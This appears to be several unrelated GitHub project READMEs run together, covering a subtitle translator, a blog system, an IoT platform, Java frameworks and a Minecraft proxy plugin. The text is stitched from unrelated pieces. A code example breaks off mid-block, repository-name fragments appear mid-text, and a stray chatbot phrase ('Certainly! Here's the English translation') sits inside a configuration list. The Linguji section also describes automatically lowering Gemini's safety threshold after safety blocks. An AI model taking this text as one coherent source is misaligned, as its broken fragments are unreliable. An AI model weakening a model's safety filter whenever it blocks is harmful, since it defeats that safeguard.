_**jimaku** ( 字幕 / じまく ) : Japanese word for ""subtitles""._

<br>

Linguji is a subtitle translator powered by AI!<br>
It automatically batch-translates subtitle files and even video files with subtitles!

## Key Features

- **Batch Translation:** Automatically translate multiple files at once without manually choosing the next file!
- **GUI:** Everything in Linguji can be done in a GUI, so no need for manually editing configs or typing commands.
- **Supported Formats:**
  - **Subtitles:** Currently handles ASS and SRT (SubRip) files.
  - **Videos:** Works with MKV files containing ASS and SRT subtitles.
- **Translation Engines:** Linguji supports various translation engines, including Gemini Pro, DeepL, [DeepLX](https://github.com/OwO-Network/DeepLX), and Libre Translate. Choose the engine that best suits your needs.
- **Formatting Preservation:** One of Linguji's priorities is to preserve the original subtitle text formatting as good as possible during translation.
- **Advanced Error Handling:** Linguji strives to keep the translation process going by working around various errors. This includes adapting its translation process to avoid triggering the same error again, like adjusting Gemini's safety threshold after encountering profanity or safety-related blocks.
- **Fallback Translator:** The fallback translation engine is used when the primary engine fails to translate the given subtitles.

# Getting Started

Download the [latest release](https://github.com/Keksuccino/Linguji/releases) for your operating system, then run the `linguji` executable inside.

To start translating subtitle files, simply **set a valid Gemini API key** and put all your subtitle files and video files into the `input_subtitles` folder (by default) that should be at the same path as the `linguji` executable.

Now simply hit the **Start Translation Process** button and see the magic happen!

If you need help getting Linguji to work or have any questions, please join my [Discord](https://discord.gg/rhayah27GC).

# Add Custom Translatable Languages

Your language is missing from the languages menu? No problem!<br>
You can add custom languages by adding them to the `custom_locales.json` file that gets created at the same path as Linguji's exectuable when running it for the first time.

For example, lets add a custom language to the file:

```
[
  {
    ""name"": ""example_name_lowercase_without_spaces"",
    ""display_name"": ""Example Display Name"",
    ""iso"": ""ex"",
    ""iso3"": ""exa""
  },
  {
    ""name"": ""example_name_lowercase_without_spaces_2"",
    ""display_name"": ""Example Display Name 2"",
    ""iso"": ""ex"",
    ""iso3"": ""exa""
  },
  {
    ""name"": ""trigedasleng"",
    ""display_name"": ""Trigedasleng"",
    ""iso"": ""ts"",
    ""iso3"": ""tri""
  }
]
```

We added the fictional language `trigedasleng` below the existing two example entries.<br>
Don't forget the **comma** after every `}`, except the very last one!

When adding **real languages**, make sure to use the correct **ISO** and **ISO-3** language codes!<br>
There's a pretty good [list with language codes](https://www.loc.gov/standards/iso639-2/php/code_list.php) you can use for that.<br>
The first code (3-letter-code) is the ISO-3 code, the second one (2-letter-code) is the ISO code.<br>
If there are two or more ISO-3 codes for the same language, use the one with the `(T)` at the end, but don't include the `(T)`.

Keep an eye on the **debug log** when using custom languages, to see if the translation engines support it!

# Requirements

- Java 17

- Linguji needs [FFMPEG](https://www.gyan.dev/ffmpeg/builds/) (full build) and [MkvToolNix](https://mkvtoolnix.download/downloads.html) for video file support.<br>
If you plan to translate video files, make sure to place all FFMPEG executables in the `ffmpeg` directory and all MkvToolNix executables in the `mkvtoolnix` directory. Both directories get created at the same path as the Linguji executable when running Linguji for the first time.

## 前言

 本着不想造轮子的理念用过**halo**和**hexo**，见过 **[蘑菇博客](https://gitee.com/moxi159753/mogu_blog_v2)**和**[拾壹博客](https://gitee.com/quequnlong/shiyi-blog)**。别人的用着终究不是很顺手。最终觉得还是自己写个用也是不错的，就当做练手，也是为了折腾。在2023年初开始本项目的开发，开始打算简单写写能用就行，不过最后感觉既然都写了，那就多写点东西吧。目的打造一个**笔记+博客+本地网盘**的项目，现在还没完全构思好，边写边构思。(本项目还未完成，持续更新中，如果有想法的小伙伴也可以分享自己的看法)

## 项目介绍

DotCode(点码），是一个前后分离的博客系统。

前端使用 **Vue** + **ElementUi** 和**Vue 3 + TypeScript + Vite + ElementPlus**

后端使用 **SpringBoot** + **Mybatis-plus**进行开发，使用**Sa-Token**作为登录验证和权限校验。

## 项目特点

- 后台采用父子包的方式以及友好的代码结构及注释，便于阅读及二次开发

- 实现前后端分离，通过 **Json** 进行数据交互，前端再也不用关注后端技术

- 页面交互，后台管理使用 **Vue2.x**，门户展示采用**Vue3**。

- 引入 **RBAC** 权限管理设计，灵活的权限控制，按钮级别的权限控制，满足绝大部分的权限需求

- 采用**Markdown** 编辑器([vditor](https://b3log.org/vditor/)），更符合开发者的编辑方式

- 一键建站，快速迁移，数据备份，Markdown导入，Markdown导出

##  项目目录

- doc：资源文件；
- xiaohai_admin: 系统入口； 
- xiaohai_common：提供公共类；
- xiaohai_file：提供文件上传相关服务；
- xiaohai_generator：提供mybatis-plus代码生成相关服务；

[![OPENIITA/iita-iot-web-admin](https://gitee.com/open-iita/iita-iot-web-admin/widgets/widget_card.svg?colors=393222,ebdfc1,fffae5,d8ca9f,393222,a28b40)](https://gitee.com/open-iita/iita-iot-web-admin)

 **演示地址：** [点击访问](http://117.72.13.229)


**系统截图**

![输入图片说明](doc/screenshot.png) 



#### 软件架构
软件架构说明
本系统采用springboot、jpa、vertx、redis、H2、mysql、elasticsearch、TDEngine、RocketMq、sa-token等框架和第三方软件，中间件采用模块化无侵入集成非常容易扩展和替换。

默认使用内置的redis、h2数据库、es时序数据库和vertx消息总线以减小启动难度，可实现 **零配置一键启动** ，程序在第一次启动的时候会使用data/init目录的示例数据进行初始化。

管理员账号密码：admin/admin123

**注：** es版本为7.15.2，mysql版本为8.0+

##### H2数据库切换为mysql方法（其它数据库同理）
1、删掉.init、iotkit.mv.db、iotkit.trace.db文件

2、将iot-data-serviceImpl-rdb/pom.xml中的mysql驱动注释放开

3、application.yml 注释掉内置H2数据库，打开mysql配置注释（先建好库）

##### es切换为TDengine(版本：3.x)方法
1、删掉.init和关系数据库数据

2、注释掉iot-starter/pom.xml中的 iot-temporal-serviceImpl-es，并打开iot-td-temporal-service的注释

3、注解掉iot-starter下application.xml中的elasticsearch配置，并打开td-datasource配置

##### 消息总线切换为RocketMq方法

1、注释掉iot-starter/pom.xml中的 iot-message-event-bus，并打开iot-message-rocketmq的注释

2、application.xml中打开rocketmq配置

#### Docker运行
docker pull iotkits/iot-iita:latest

docker run -p 8082:8082  -p 8086:8086 -p 8130-8140:8130-8140 iotkits/iot-iita:latest

启动后访问 http://localhost:8082/

#### 源码运行步骤
在线文档:[知识库](https://open-iita.feishu.cn/wiki/Km67wBKNNiFMrMkldCJcxa6vnLe)

在配置好相应的jdk11环境后，推荐使用idea拉取代码，等待项目加载完成以后，先在Terminal里执行mvn clean install，然后在idea的maven操作框上点击下刷新
![1](doc/image-20230702173737805.png)

然后就点击启动，看到如下所示日志即表示启动成功：

![image-20230702174747305](doc/image-20230702174747305.png)

#### 后端常见问题以及处理方式

#### 1、数据初始化不成功

删除以下标红的几个文件以及文件夹后，重复下上面启动项目的操作：

![image-20230702173852342](doc/image-20230702173852342.png)

切换成外置中间件数据库时，也注意删除相关库以及数据。

##### 2、提示找不到QTbxxxxx类

在Terminal里执行mvn clean install，再刷新下，这个出现的原因是因为采用了querydsl插件，打包时会生成相关的类，有可能idea的扫描不及时，导致未识别到

![111](doc/image-20230702173737805.png)

##### 3，启动提示xxMapperxxx类bean重复

处理办法同2一样，原因也类似，采用了mapstruct plus插件，打包时候会生成对应类的getset方法工具类，可能idea的扫描不及时，导致未识别到


#### 服务器部署

执行maven打包在iot-starter模块中将打包后的iot-starter.xx.zip上传到服务器  
解压后先执行： java -jar lib/iot-start.xxx.jar，确认成功后续可使用  bin/start.sh或bin/start.bat启动。

<h1 align=""center"">Koupleless: Modular Development Framework and Serving Platform</h1>

<div align=""center"">

English | [简体中文](./README-zh_CN.md)

</div>

Would you like your application to start in just 10 seconds, consuming only 20MB of memory? Have you encountered issues with large applications causing collaboration bottlenecks and low release efficiency? Are you struggling with the high resource and maintenance costs associated with numerous small applications? If you're facing these challenges, then Koupleless might be the solution you're looking for. Koupleless approaches application architecture from a modular perspective, offering an extremely low-cost solution to address pain points encountered throughout the entire lifecycle of application development, operation, and execution:

1. Excessive application fragmentation leading to high machine and long-term maintenance costs
2. Insufficient application fragmentation causing collaboration bottlenecks
3. Lengthy application build, startup, and deployment times resulting in low iteration efficiency
4. Severe fragmentation of SDK versions with high upgrade costs and long cycles
5. High costs associated with building platforms and middle platforms, as well as difficulties in business asset precipitation and architectural constraints
6. Long microservice chains leading to poor call performance
7. High costs associated with microservice decomposition and evolution

How does Koupleless address these issues? Koupleless vertically and horizontally splits traditional applications, with the vertical split separating the base and the horizontal split separating multiple modules. The base shields modules from infrastructure concerns, while modules contain only the business-specific portion, enabling quick startup and insulating them from infrastructure concerns, allowing module developers to experience a Serverless-like environment. Koupleless thus evolves into a low-cost, Serverless solution by refining the granularity of development and operations while shielding infrastructure. For detailed explanations of the principles, please refer to the official website.
Further detailed explanations of the principles are available on [the official website](https://koupleless.io/docs/introduction/architecture/arch-principle/).

![image](https://github.com/koupleless/koupleless/assets/3754074/004c0fa5-62f6-42d7-a77e-f7152ac89248)

The most important aspect is that Koupleless can **assist existing applications** in evolving into a modular development model **at an extremely low cost**, addressing the aforementioned issues and helping businesses reduce costs, increase efficiency, and enhance competitiveness.

## The Advantages of Koupleless

Koupleless is a mature development framework and operational scheduling platform capability that has been refined internally within Ant Group for 5 years. Compared to traditional image-based application models, it offers approximately 10 times improvement in development, operations, and runtime calling. Summarized into 5 key features: Fast, Cost-efficient, Flexible deployment, Smooth evolution, and Production-scale validation.

Here are performance data comparing modular development and deployment with traditional image-based approaches for an actual production application.

## What is a Module?

Modules utilize extreme sharing and isolation technologies, which enable hot deployment (updating online code without restarting the machine).

Isolation is achieved through ClassLoader class isolation based on [SOFAArk](https://github.com/sofastack/sofa-ark) and object isolation based on [SpringBoot SpringContext](https://github.com/spring-projects/spring-boot).

Sharing is facilitated by class delegation loading based on [SOFAArk](https://github.com/sofastack/sofa-ark) and cross-SpringContext object lookup and invocation based on SpringBootManager.

So, in physical terms, a module can be considered as one ClassLoader + one SpringContext.

## What is the Base？
The base is just a regular application, same with the original app (such as standard SpringBoot).

## Quick start
Please check [the official website Quick Start](https://koupleless.io/docs/quick-start/).

# Introduction

* In this project we defined a generic workflow description specification(FlowSpec)
* We developed a FlowSpec based migration tool(MigrationX) to migrate workflow models from different workflow scheduling systems to DataWorks workflow
  model.
* We can use this tool to develop conversion tools for other scheduling system workflow model.

EladLeev/KeyToField-smt,main,"# KeyToField - SMT for Kafka Connect / Debezium
A Kafka Connect SMT that allows you to add the record key to the value as a named field.

## Overview
The `KeyToField` transformation is designed to enhance Kafka Connect functionality by including the record key as a field within the record's value. This can be particularly useful in scenarios where downstream systems require access to the original key alongside the record data.

> This SMT was featured on [Confluent's Newsletter](https://developer.confluent.io/newsletter/you-put-what-in-your-events/#:~:text=A%20single%20message%20key%20to%20field%20transform%20for%20Kafka%20Connect/Debezium%20by%20Elad%20Leev!%20In%20a%20way%20it%E2%80%99s%20the%20reverse%20of%20the%20ValueToKey%20SMT%20that%20comes%20with%20Kafka%20Connect%2C%20useful%20for%20when%20the%20fields%20in%20the%20key%20are%20not%20included%20in%20the%20value.)! 🚀

## Features
* Add the record key to the value as a named field.
* Customizable field name and delimiter.

## Installation
1. Use the latest release on GitHub, or build the JAR file from source using Maven:
```bash
mvn clean package
```
2. Copy the generated JAR file (`keytofield-transform-<version>.jar`) to the Kafka Connect plugins directory.
3. Restart Kafka Connect for the reload the plugin directory.
4. Update your connector with the SMT configuration

## Configuration
The KeyToField transformation can be configured with the following properties:

* `field.name`: Name of the field to insert the Kafka key to (default: `kafkaKey`).
* `field.delimiter`: Delimiter to use when concatenating the key fields (default: `-`).

## Usage
To use the `KeyToField` transformation, add it to your Kafka Connect connector configuration:
```
transforms=keyToField
transforms.keyToField.type=com.github.eladleev.kafka.connect.transform.keytofield.KeyToFieldTransform
transforms.keyToField.field.name=primaryKey
transforms.keyToField.field.delimiter=_
```

### Example
Consider a Kafka topic with the following record:


```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example""
  }
}
```

After applying the `KeyToField` transformation, the record will be transformed as follows:

```json
{
  ""key"": {
    ""id"": 123,
    ""timestamp"": 1644439200000
  },
  ""value"": {
    ""data"": ""example"",
    ""primaryKey"": ""123_1644439200000""
  }
}
```
## Local Development
For your convenience, under `dev/` you can find a `docker-compose` file that contains all necessary components for local development and testing. Kafka Connect will automatically load the connector from the `target/` directory.   
Use the attached bash script to submit a new Kafka Connect connector. `Adminer` can be used to ingest new data to the database, reflected by an event in Kafka.

coralblocks/CoralProto,main,"# CoralProto
A fast, binary and garbage-free serialization framework with a simple schema definition language.

## Features
- Simple schema definition language with message type and subtype
- Fast parsing (or direct access without parsing)
- Strictly binary (big-endian)
- Ascii encoding for logging/debugging
- Garbage-free (no GC overhead)
- Primitive types (boolean, char, byte, short, int, long, float and double)
- Fixed byte and char arrays
- Variable byte and char arrays (VarChars and VarBytes)
- Enum fields (CharEnum, ShortEnum, IntEnum and TwoCharEnum)
- Fields can be made optional
- Repeating groups with nesting support (repeating groups inside repeating groups)
- Schema evolution by appending new (optional or non-optional) fields

## Schema Definition Language
```plain
    CLASSNAME = com.coralblocks.coralproto.example.PriceChangeMessage
    TYPE = P
    SUBTYPE = C
    
    symbolId: long
    symbolDesc: varchars(128)
    mqReqId: long!
    
    orders:
        side: boolean
        levelId: long!
        priceLevel: double
        qty: int
        legs:
          legId: int
          legDesc: chars(8)!
        orderId: long
    
    lastTradeQty: long!
    lastTradePrice: double!
```
- TYPE and SUBTYPE are mandatory
- An exclamation mark at the end of a field indicates that the field is optional
- Repeating groups are created through indentation
- The number between parenthesis for varchars (and varbytes) is the maximum allowed size/length
- The number between parenthesis for chars (and bytes) is the fixed size/length

**NOTE:** For convenience, you can place the schema specification inside the Java class so that when you execute its main method the class is updated with the generated source code of the message. You can see an example [here](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/example/PriceChangeMessage.java).

## Writting the Message Fields
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);
proto.symbolDesc.set(""IBM"");
proto.mqReqId.markAsNotPresent();

    proto.orders.clear();

**NOTE:** The full automated test for the PriceChangeMessage can be seen [here](https://github.com/coralblocks/CoralProto/blob/main/src/test/java/com/coralblocks/coralproto/PriceChangeMessageTest.java).

## Writting to and Reading from a ByteBuffer
```java
PriceChangeMessage proto = new PriceChangeMessage();

proto.symbolId.set(1111L);

ByteBuffer bb = ByteBuffer.allocate(1024);
proto.write(bb);
bb.flip();

PriceChangeMessage received = new PriceChangeMessage();

received.read(bb);

Assert.assertTrue(received.equals(proto));
Assert.assertEquals(proto.orders.symbolId.get(), received.orders.symbolId.get());
```

## Using a ProtoParser
```java
public static class MyProtoParser extends ProtoParser {

    @Override
    protected Proto[] defineProtoMessages() {
        return new Proto[] {
                new ProtoMessage1(),
                new ProtoMessage2()
        };
    }
}

ProtoParser protoParser = new MyProtoParser();

Proto proto = protoParser.parse(byteBuffer);

if (proto == null) throw new RuntimeException(""Cannot parse ByteBuffer to Proto!"");

char type = proto.getType();
char subtype = proto.getSubtype();

if (type == ProtoMessage1.TYPE && subtype == ProtoMessage1.SUBTYPE) {
    ProtoMessage1 protoMessage1 = (ProtoMessage1) proto;
    // access the ProtoMessage1 fields and be happy...
} else if (type == ProtoMessage2.TYPE && subtype == ProtoMessage2.SUBTYPE) {
    ProtoMessage2 protoMessage2 = (ProtoMessage2) proto;
    // access the ProtoMessage2 fields and be happy...
} else {
    throw new RuntimeException(""Got a proto that I don't know how to handle: "" + proto);
}
```

## Using Enum Fields
You should provide enumerations that implement [CharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/CharEnum.java), [ShortEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/ShortEnum.java), [IntEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/IntEnum.java) or [TwoCharEnum](https://github.com/coralblocks/CoralProto/blob/main/src/main/java/com/coralblocks/coralproto/enums/TwoCharEnum.java). Below an example:
```java
public static enum Side implements CharEnum { 

    BUY('B'), 
    SELL('S');

    private final char b;
    public final static CharMap<Side> ALL = new CharMap<Side>();
    
    static {
        for(Side s : Side.values()) {
            if (ALL.put(s.getChar(), s) != null) {
                throw new IllegalStateException(""Cannot have two sides with the same character: "" + s);
            }
        }
    }
    
    private Side(char b) {
        this.b = b;
    }
    
    @Override
    public final char getChar() {
        return b;
    }
}
```
And to define in your schema you simply do:
```plain
    side:     charEnum(Side) 
```
The corresponding char of the enum will be transmitted through the wire.

## Float and Double Fields
- Floats are transmitted through the wire as integers (4-byte big-endian). The default precision is 4 decimals.
- Doubles are transmitted through the wire as longs (8-byte big-endian). The default precision is 8 decimals.

If you need more or less decimal precision, you can pass the number of decimals when defining the field in the schema:
```plain
    myFloat1: float 
    myFloat2: float(3)
    myFloat3: float(5)
    myDouble1: double 
    myDouble2: double(7)
    myDouble3: double(9)	
```

## Evolving the Schema
You can evolve the schema without breaking compatibility by appending new fields to the end of your message. For example, you can evolve:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
```
by appending a new field:
```plain
    CLASSNAME = com.coralblocks.coralproto.example.ProtoMessage1A
    TYPE = P
    SUBTYPE = A
    
    symbolId: long
    symbolDesc: varchars(128)!
    extraField: int
```
Then you can send an old version (without the field) to the new version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1 p1 = new ProtoMessage1();

p1.symbolId.set(2L);
p1.symbolDesc.set(""IBM"");

p1.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1A.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1A.SUBTYPE, bb.get());

// schema has evolved, it now has an extra field...

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.read(bb);

Assert.assertEquals(2L, p1A.symbolId.get());
Assert.assertEquals(""IBM"", p1A.symbolDesc.get().toString());
Assert.assertEquals(0, p1A.extraField.get()); // default value
```
And you can send a new version (with the field) to the old version:
```java
ByteBuffer bb = ByteBuffer.allocate(1024);

ProtoMessage1A p1A = new ProtoMessage1A();

p1A.symbolId.set(2L);
p1A.symbolDesc.set(""IBM"");
p1A.extraField.set(111);

p1A.write(bb);

bb.flip();

Assert.assertEquals(ProtoMessage1.TYPE, bb.get());
Assert.assertEquals(ProtoMessage1.SUBTYPE, bb.get());

ProtoMessage1 p1 = new ProtoMessage1();

p1.read(bb);

Assert.assertEquals(2L, p1.symbolId.get());
Assert.assertEquals(""IBM"", p1.symbolDesc.get().toString());
```
**NOTE:** We are changing the message name from `ProtoMessage1` to `ProtoMessage1A` just to be able to test inside the same class. When you evolve a message you will want to keep the same message name.

## Generating Source Code
To generate the Java source code of your messages from the schema definition files, you should do:
```plain
$ java com.coralblocks.coralproto.IDL <FOLDER_NAME> <DRY_RUN> <EXTENSION>
```
- The `FOLDER_NAME` argument is the folder where the test files containing the scheme definition of your messages are located. Each message should have its own file.
  
- The `DRY_RUN` argument is to test without replacing any source code. It defaults to false.
  
- The `EXTENSION` argument is the extension of the text files with the schema definition. It defaults to `.idl`.
  
The source code of the messages will be generated inside the same folder.

**NOTE:** When the source code is generated you will most probably need to use `ORGANIZE IMPORTS` (usually CTRL + O) of your IDE to add the correct import statements for the code to compile.

## Logging in Ascii
You can print/log your message in ascii. See below:
```java
bb.clear();
proto.writeAscii(true, bb); // short version (without the message name, just type and subtype)
bb.flip();

Assert.assertEquals(""AF|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));

bb.clear();
received.writeAscii(false, bb); // long version (with the message name, type and subtype)
bb.flip();

Assert.assertEquals(""AF (AllFieldsProtoMessage)|Y|33|S|1111|222222|3300"", ByteBufferUtils.parseString(bb));
```

WMS-DEV/usos4j,main,"# usos4j - Java client for USOS API

✨ using USOS API just became fun ✨

## Features

- **Simplified Communication**: Easily interact with the USOS API without dealing with the complexities of low-level HTTP requests.
- **Detailed Documentation**: Comprehensive documentation, with practical demos, to guide developers on how to use the library effectively.
- **Authentication Handling**: Streamlined handling of OAuth and access tokens for secure communication with the USOS API.
- **Modular Design**: Organized into modules for easy integration and maintenance.
- **Well tested**: Includes integration and architecture tests to ensure the reliability and stability of the library.
- **Open for extension**: The library includes constructs, that make it easy to integrate additional modules, without relying on the library development itself, see generic endpoint demo below

## Getting Started

### Note: JDK 17+ is required

The library is available on maven-central, use this code snippet to use it!
```XML
<dependency>
    <groupId>pl.wmsdev</groupId>
    <artifactId>usos4j</artifactId>
    <version>1.1.4</version>
</dependency>
```

Consider checking out our demos on how to use usos4j on basic scenarios:

- [Console application with code-based authentication](https://github.com/WMS-DEV/usos4j/tree/master/demo)
- [Web application with oAuth authentication](https://github.com/WMS-DEV/usos4j/tree/master/spring-demo)
- [Full Spring Security integration - log in to your aplication through USOS](https://github.com/WMS-DEV/usos4j/tree/master/spring-security-demo)

We also offer you an access to a generic endpoint, which can make it easier for you to access USOS as you wish, providing the authentication support, here is an example on how you can use it:
```java
var usos = Usos.builder()......build();
var serverApi = usos.getServerApi();
var usosApiRefModuleResponse = serverApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as an unauthenticated API client
var userApi = usos.getUserApi();
var userApiRefModuleResponse = userApi.generic()
                .request(""services/apiref/module"", Map.of(""name"", List.of(""services/crstests"")), UsosApiRefModule.class); // this is performed as a user
```

## Integrated modules:
The library supports
- apiref
- apisrv
- calendar
- cards
- courses
- credits
- fac
- feedback
- grades
- groups
- mailing
- news
- payments
- phones
- photos
- plctests
- progs
- registrations
- terms
- theses
- timetable
- rest of the modules thanks to generic endpoint implementation

We decided to integrate the most interesting endpoints from the user perspective. We are very open for contributions integrating more modules, but it's not so easy, as we are not in possesion of any USOS testing enviroment, meaning we can only integrate modules, that the universities of contributors use.

## Documentation

- Checkout our contribution guidelines
- To fully understand the concepts in the library, consider visiting debug module, where you will be able to find integration tests

## System configuration

You can find available websites for generating USOSAPI keys in [the installations list](https://apps.usos.edu.pl/developers/api/definitions/installations/) 

Usos integration tests and demos, are based on this system enviroments configuration:

- usos_baseurl - base url of USOSAPI that you would like to use. For Politechnika Wrocławska it would be https://apps.usos.pwr.edu.pl/
- usos_consumerKey - Consumer key. You can generate it on a proper USOS APPS website. For Politechnika Wrocławska it would be https://apps.usos.pwr.edu.pl/developers/
- usos_consumerSecret - Consumer secret, also generated from the website above
- usos_login - login to your USOS account, if you wish to use HeadlessUsosProvider (automatic possesion of authorization tokens)
- usos_password - password to your USOS account, as above

BungeePteroPower is a plugin that can automatically start/stop servers based on the number of players.  
It can start and stop servers on the [Pterodactyl panel](https://pterodactyl.io/) when players join or leave the Bungeecord proxy server.  
This helps to save server resources and manage servers more efficiently.  

https://github.com/Kamesuta/BungeePteroPower/assets/16362824/019fdfc5-f0fc-4532-89f3-3342b5812593

## Key Features

- Automatically stops servers using Pterodactyl's API when there are no players on the server for a certain period of time.
    - The time until shutdown can be configured for each server.
- Automatically starts servers using Pterodactyl's API when players join the server.
- Permissions settings allow for specifying players who can manually start servers and players for whom automatic startup is enabled upon joining.
- You can reset the server from a backup when it shuts down.
    - This is useful when creating mini-game servers that reset once played.

![Overview](https://github.com/Kamesuta/BungeePteroPower/assets/16362824/3cece79e-b41a-4119-a6cd-4800dd4f705d)

## Download

- You can download it from [Spigot](https://www.spigotmc.org/resources/%E2%9A%A1-bungeepteropower-%E2%9A%A1-start-stop-servers-when-player-join-leave.114883/) or [GitHub Releases](https://github.com/Kamesuta/BungeePteroPower/releases).

## Requirements

- Java 11 or higher
    - uses `java.net.http.HttpClient` in Java 11 for REST API communication with Pterodactyl.

## Getting Started

1. Obtain an API key in the Pterodactyl panel.
    - The client API key for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
2. Add the plugin to the BungeeCord server and start it.
3. Configure the [Required Settings](#required-settings) in the generated `plugins/BungeePteroPower/config.yml` file.
    ```yml
    # Pterodactyl configuration
    pterodactyl:
      # The URL of your pterodactyl panel
      # If you use Cloudflare Tunnel, you need to allow the ip in the bypass setting.
      url: ""https://panel.example.com""
      # The client api key of your pterodactyl panel. It starts with ""ptlc_"".
      # You can find the client api key in the ""API Credentials"" tab of the ""Account"" page.
      apiKey: ""ptlc_000000000000000000000000000000000000000000""
    
    # Per server configuration
    servers:
      pvp:
        # Pterodactyl server ID
        # You can find the Pterodactyl server ID in the URL of the server page.
        # For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.
        id: 1234abcd
        # The time in seconds to stop the server after the last player leaves.
        # If you don't want to stop the server automatically, set it to -1.
        # If you set it to 0, the server will be stopped immediately after the last player leaves.
        timeout: 30
    ```
4. Reload the config with the `/ptero reload` command.
5. Configure the [Permission Settings](#permission-settings).  
    (You **MUST** configure permission to use this plugin, otherwise the player will not be able to do anything!)  
    You can use either of the following methods.  
    - Use a permission plugin like [LuckPerms](https://luckperms.net/).
        1. For LuckPerms, use the following commands to set permissions:
            ```
            # The player can start all servers
            /lp user <player_name> permission set ptero.autostart.*
            # The player can start specific server
            /lp user <player_name> permission set ptero.autostart.<server_name>
            # All players can start all servers
            /lp group default permission set ptero.autostart.*
            ```
            ※ `<player_name>` refers to the player's name, `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
    - Use built-in permission settings.
        1. Open `config.yml`.
        2. Add the following settings to the `config.yml` file.
            ```yml
            permissions:
                default:
                # All players can start all server
                - ptero.autostart.*
                # All players can start specific server
                - ptero.autostart.<server_name>
            ```  
            ※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
        3. Restart the BungeeCord server.
  
## Usage

### Automatic Startup

- Servers will automatically start when players attempt to join each server on BungeeCord.
    - This feature is available only to players with the `ptero.autostart.<server_name>` permission.

### Manual Start/Stop

- Use the `/ptero start <server_name>` command to manually start a server.
    - This command is available only to players with the `ptero.start.<server_name>` permission.
- Use the `/ptero stop <server_name>` command to manually stop a server.
    - This command is available only to players with the `ptero.stop.<server_name>` permission.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.

### Reloading config.yml/Language files

- Use `/ptero reload` to reload the config.yml and language files.

## Configuration

The `config.yml` file includes the following settings, but not all items need to be configured.

### Required Settings

- `pterodactyl`: Configure settings for Pterodactyl, including URL and API key.
    - `url`: Set the URL of your Pterodactyl panel. (Example: https://panel.example.com/)
        - If you are using services like Cloudflare Tunnel, ensure proper bypass settings for IP-based communication.
    - `apiKey`: Set the client API key for Pterodactyl.
        - It begins with `ptlc_`.
        - Client API keys for Pterodactyl can be found in the ""API Credentials"" tab on the account page.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `id`: Set the server ID on Pterodactyl.
        - Server IDs on Pterodactyl can be found in the URL of the server page.
        - For example, if the URL is https://panel.example.com/server/1234abcd, the server ID is 1234abcd.

### Optional Settings

- `version`: Set the version of the plugin.
    - When updating the plugin, a warning will be displayed if this value does not match the plugin version.
    - A `config.new.yml` file will be generated, and manual migration of settings using a merge tool is required.
    - After migration, please change this value to the new version.
- `checkUpdate`: Set whether to check for plugin updates. The default is `true`.
- `language`: Set the language to be used. The default is English (`en`).
    - Refer to the comments in the [config file](./src/main/resources/config.yml) for supported languages.
- `startTimeout`: After starting a server with this plugin, it will stop the server if there are no players for a certain period. The unit is seconds.
    - After starting, the server will stop after the `startTimeout` plus the server's timeout duration.
    - Setting it to 1 keeps the server running until players join and leave.
- `powerControllerType`: Set the type of power controller to be used.
    - The built-in PowerController currently supports only `pterodactyl`, which operates Pterodactyl.
    - By adding add-ons, you can add your own custom PowerController.
      Certainly! Here's the English translation of the provided description:
- `useSynchronousPing`: This setting determines whether to perform **synchronous** pinging to the server during login. (Experimental feature)
    - When enabled, pinging the server during login will happen synchronously rather than asynchronously.
    - This allows displaying BungeePteroPower messages (`join_autostart_login` in messages.yml) instead of the ""Could not connect to a default or fallback server"" message upon login.
    - The default value is `false`. Enabling this can be useful if you want to set servers (such as lobby servers) to a suspended state in BungeePteroPower immediately after login.
- `startupJoin`: After server startup, it is used to automatically join players to the server and check the server's status.
    - `timeout`: Set the maximum waiting time for players to join after server startup.
        - Set this value to the maximum time it takes for the server to start.
        - Setting it to 0 disables this feature, and players will not automatically join after startup.
    - `joinDelay`: Once the server is pingable, wait the specified amount of seconds before sending the player to the server
        - This is useful to wait for plugins like Luckperms to fully load
        - If you set it to 0, the player will be connected as soon as the server is pingable
    - `pingInterval`: Set the interval for checking the server's status.
- `restoreOnStop`: Configure settings for the feature to reset the server from a backup when it is stopped.
    - `timeout`: Set the maximum waiting time after sending the stop signal for the server to stop. (The restore will be performed after the server stops)
    - `pingInterval`: Set the interval for checking if the server is offline after sending the stop signal.
- `servers`: Configure settings for each server. Set the server ID and the time until automatic shutdown.
    - `timeout`: When there are no players on the server, it will stop after a certain period. The unit is seconds.
    - `backupId`: The UUID of the backup to restore when the server stops.
        - If this setting is empty or removed, no restore from backup will be performed when the server stops.
        - Useful for servers that need to be reset after each game.

### Permission Settings

BungeePteroPower plugin allows fine-grained control over commands available to players for each server using permissions.

- `ptero.autostart.<server_name>`: Servers will automatically start when players join each server on BungeeCord for players with this permission.
- `ptero.start.<server_name>`: Allows the `/ptero start <server_name>` command to manually start a server.
    - If a player doesn't have `ptero.autostart.<server_name>` permission but has this permission, they will see a manual start button when they join the server.
- `ptero.stop.<server_name>`: Allows the `/ptero stop <server_name>` command to manually stop a server.
- `ptero.reload`: Allows the `/ptero reload` command to reload the config.

※ `<server_name>` refers to the server name specified in BungeeCord's `config.yml`.
※ Specify `*` for `<server_name>` to apply permissions to all servers.

### About Language Files

- You can set the language in config.yml using the language option.
    - Please refer to the comments in the config file for the supported languages.
- Upon startup, a file for the language set in config.yml will be generated.
